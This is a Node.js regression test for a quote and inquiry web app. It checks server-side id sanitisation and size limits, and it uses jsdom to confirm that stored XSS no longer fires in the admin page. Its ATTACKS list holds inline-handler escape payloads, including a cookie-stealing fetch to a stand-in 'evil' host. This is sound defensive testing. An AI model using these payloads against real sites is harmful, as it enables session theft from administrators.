/* PJ 검증: 공개 제출 입력의 안전성 + 관리자 화면 저장형 XSS 회귀.

   배경 — /api/quotes·/api/inquiries POST는 인증 없이 누구나 호출한다. 예전엔
   payload.id를 검증 없이 저장했고, 관리자 화면은 그 id를
   onclick="openDetail('${id}')" 안에 그대로 보간했다. 즉 익명 제출자가 넣은
   문자열이 로그인한 관리자 세션에서 실행됐다(2026-07-29 jsdom으로 재현 확인,
   운영 데이터 26건은 전부 정상이라 악용 흔적은 없었다).

   이 파일은 그 구멍이 다시 열리는 걸 두 층에서 잡는다:
     ① 서버 — id 형태 강제, 본문 크기 상한, 숫자 필드 강제
     ② 화면 — 실제 렌더 결과에서 인라인 핸들러가 깨지지 않는지 (jsdom 실행)
   실행: node ai-loop/test_pJ_public_input.js  (프로젝트 루트에서) */
const { JSDOM } = require('jsdom');
const fs = require('fs');
const path = require('path');
const ROOT = path.join(__dirname, '..');
const read = (f) => fs.readFileSync(path.join(ROOT, f), 'utf8');
const { safeId, payloadTooLarge, toNumberOrNull, trimText, SAFE_ID_RE, MAX_PAYLOAD_BYTES } =
  require(path.join(ROOT, 'api', '_lib', 'public_input.js'));

let pass = 0, fail = 0;
const ok = (name, cond, extra = '') => {
  if (cond) { pass++; console.log('  ✓ ' + name); }
  else { fail++; console.log('  ✗ ' + name + (extra ? '  → ' + extra : '')); }
};

/* 인라인 핸들러를 탈출하려는 대표적 형태들 */
const ATTACKS = [
  `x'); alert(1); ('`,
  `x" onmouseover="alert(1)`,
  `'><img src=x onerror=alert(1)>`,
  `x'); fetch('//evil/?c='+document.cookie); ('`,
  `"><script>alert(1)</script>`,
];

console.log('[1] 서버 — id 형태 강제');
for (const a of ATTACKS) {
  const out = safeId(a);
  ok(`공격 id가 안전한 형태로 대체됨: ${JSON.stringify(a.slice(0, 24))}`, SAFE_ID_RE.test(out), out);
}
ok('정상 id는 그대로 유지(재전송 멱등성 보존)', safeId('m9x2k1abc') === 'm9x2k1abc');
ok('빈 값이면 서버가 새로 만든다', SAFE_ID_RE.test(safeId('')));
ok('숫자·객체도 서버 생성으로 대체', SAFE_ID_RE.test(safeId(12345)) && SAFE_ID_RE.test(safeId({})));
ok('64자 초과는 거부하고 새로 만든다', safeId('a'.repeat(65)) !== 'a'.repeat(65));
ok('64자는 허용', safeId('a'.repeat(64)) === 'a'.repeat(64));

console.log('\n[2] 서버 — 본문 크기 상한');
ok('정상 크기 통과', !payloadTooLarge({ name: '홍길동', message: 'x'.repeat(1000) }));
ok('상한 초과 차단', payloadTooLarge({ blob: 'x'.repeat(MAX_PAYLOAD_BYTES + 100) }));
const circular = {}; circular.self = circular;
ok('직렬화 불가(순환 참조)는 거부', payloadTooLarge(circular));
ok('실측 공유 payload(약 3.4KB)는 여유 있게 통과', !payloadTooLarge({ x: 'y'.repeat(3400) }));

console.log('\n[3] 서버 — 숫자·문자 필드 강제');
ok('숫자 문자열은 숫자로', toNumberOrNull('20') === 20);
ok('HTML 조각은 null로', toNumberOrNull('<img src=x onerror=alert(1)>') === null);
ok('빈 문자열은 null', toNumberOrNull('') === null);
ok('Infinity 거부', toNumberOrNull(Infinity) === null);
ok('정상 숫자 유지', toNumberOrNull(4) === 4);
ok('문자열 길이 절단', trimText('가'.repeat(200), 100).length === 100);
ok('문자열 아니면 null', trimText(123, 10) === null);

console.log('\n[4] 서버 — 각 엔드포인트가 실제로 이 검증을 쓰는가');
const inqSrc = read(path.join('api', 'inquiries.js'));
const qSrc = read(path.join('api', 'quotes.js'));
const shareSrc = read(path.join('api', 'quote-shares.js'));
ok('inquiries POST가 safeId 사용', /const id = safeId\(payload\.id\)/.test(inqSrc));
ok('quotes POST가 safeId 사용', /const id = safeId\(payload\.id\)/.test(qSrc));
ok('quote-shares는 서버 생성 id만', /const id = newId\(\)/.test(shareSrc) && !/payload\.id/.test(shareSrc));
for (const [n, s] of [['inquiries', inqSrc], ['quotes', qSrc], ['quote-shares', shareSrc]]) {
  ok(`${n} 크기 상한 적용`, /payloadTooLarge\(payload\)/.test(s));
}
ok('저장되는 payload의 id도 안전한 값으로 교체', /\{ \.\.\.payload, id/.test(inqSrc) && /\{ \.\.\.payload, id/.test(qSrc));
ok('quotes 인원·총액을 숫자로 못 박음', /toNumberOrNull\(payload\.participants\)/.test(qSrc) && /toNumberOrNull\(payload\.total\)/.test(qSrc));

console.log('\n[5] 화면 — safeId 헬퍼와 적용 지점');
const adminSrc = read('admin.html');
ok('safeId 헬퍼 정의', /const safeId = \(s\) =>[\s\S]{0,120}replace\(\/\[\^A-Za-z0-9_-\]\/g, ''\)/.test(adminSrc));
const rawIdSites = adminSrc.split('\n')
  .map((line, i) => ({ line, no: i + 1 }))
  .filter(({ line }) => /\$\{(c|e|linkedInq)\.id\}/.test(line));
ok('템플릿에 날 id를 쓰는 곳 없음', rawIdSites.length === 0,
  rawIdSites.map((r) => `admin.html:${r.no}`).join(', '));
ok('fmt가 숫자로 강제 변환', !/const fmt = n => '₩'\+n\.toLocaleString/.test(adminSrc));
ok('상세 모달 인원·일수를 숫자로 강제', /\$\{Number\(est\.participants\)\|\|0\}/.test(adminSrc));

console.log('\n[6] 고객 견적서 화면(estimate-view.html) — 공유 payload도 신뢰하지 않는다');
/* 공유 payload는 /api/quote-shares POST로 누구나 만들 수 있고, 담당자가 고객
   공유 링크를 열어보는 건 일상적인 동작이라 그 세션에서 코드가 도는 경로가 된다. */
const viewSrc = read('estimate-view.html');
ok('일차 번호를 숫자로 못 박는다', /const dayNo = \(day\) => Number\(day && day\.day\) \|\| 0/.test(viewSrc));
ok('인라인 핸들러에 날 day.day를 넣지 않는다',
  !/switchDayTab\('\$\{courseKey\}', \$\{day\.day\}\)/.test(viewSrc));
ok('data-day 속성에도 날 day.day를 넣지 않는다', !/data-day="\$\{day\.day\}"/.test(viewSrc));

console.log('\n[7] 화면 — 실제 렌더로 인라인 핸들러 탈출 확인 (jsdom)');
(async () => {
  const dom = new JSDOM(read('admin.html'), {
    runScripts: 'dangerously', url: 'http://localhost/admin.html',
    beforeParse(window) {
      window.fetch = () => new Promise(() => {});
      const ctx = new Proxy({}, { get: () => (() => ctx) });
      window.HTMLCanvasElement.prototype.getContext = () => ctx;
      window.IntersectionObserver = class { observe(){} unobserve(){} disconnect(){} };
      window.__XSS_FIRED = false;
    },
  });
  const { window } = dom;
  await new Promise((r) => setTimeout(r, 300));

  if (typeof window.renderInquiries !== 'function') {
    console.log('  ✗ renderInquiries를 찾을 수 없음 — 테스트 전제가 깨졌습니다');
    process.exit(1);
  }

  for (const attack of ATTACKS) {
    window.__XSS_FIRED = false;
    window.localStorage.setItem('linkedt_contacts', JSON.stringify([{
      id: attack.replace('alert(1)', 'window.__XSS_FIRED=true'),
      name: '홍길동', tel: '010-0000-0000', message: '문의', type: 'contact',
      status: 'new', read: false, timestamp: Date.now(), assignee: '',
    }]));
    window.renderInquiries();
    const btn = window.document.querySelector('#inqBody button.btn-detail');
    if (btn) { try { btn.click(); } catch { /* 핸들러 예외는 실행 성공이 아니므로 무시 */ } }
    ok(`인라인 핸들러 탈출 차단: ${JSON.stringify(attack.slice(0, 22))}`, window.__XSS_FIRED === false);
  }

  /* 숫자 자리에 HTML을 넣었을 때 태그가 살아 들어가지 않는지 */
  window.localStorage.setItem('linkedt_contacts', JSON.stringify([{
    id: 'safe123', name: '홍길동', tel: '010', message: '문의', type: 'estimate_inquiry',
    status: 'new', read: false, timestamp: Date.now(), assignee: '',
    estimate: { destLabel: '도쿄', participants: '<img src=x onerror=window.__XSS_FIRED=true>', days: 4, nights: 3, total: 1000000 },
  }]));
  window.renderInquiries();
  if (typeof window.openDetail === 'function') {
    try { window.openDetail('safe123'); } catch { /* 모달 렌더 중 예외는 아래 단언으로 판단 */ }
  }
  /* 렌더된 영역만 본다. document.body.innerHTML에는 인라인 <script>의 원문(템플릿
     문자열)까지 섞여 들어와, 화면에 없는 코드를 주입으로 오판한다 —
     실제로 처음 이 테스트가 CMS 편집기 템플릿의 <img onerror>를 잡아 잘못 실패했다.
     주입 성공 여부는 "요소로 살아났는가"로만 판단한다. */
  const rendered = ['#inqBody', '#d-estimate-block', '#detailModal']
    .map((sel) => window.document.querySelector(sel))
    .filter(Boolean);
  const injectedEls = rendered.flatMap((el) => [...el.querySelectorAll('img,script,iframe,object,embed')]);
  ok('숫자 자리에 넣은 HTML이 요소로 살아나지 않음', injectedEls.length === 0,
    injectedEls.map((e) => e.outerHTML.slice(0, 60)).join(' | '));
  ok('숫자 자리 주입 코드 미실행', window.__XSS_FIRED === false);
  const previewText = (window.document.querySelector('#inqBody .msg-preview') || {}).textContent || '';
  ok('미리보기가 숫자로 정규화됨', /0명\/4일/.test(previewText), JSON.stringify(previewText));

  console.log(`\n결과: ${pass} pass / ${fail} fail`);
  process.exit(fail === 0 ? 0 : 1);
})();
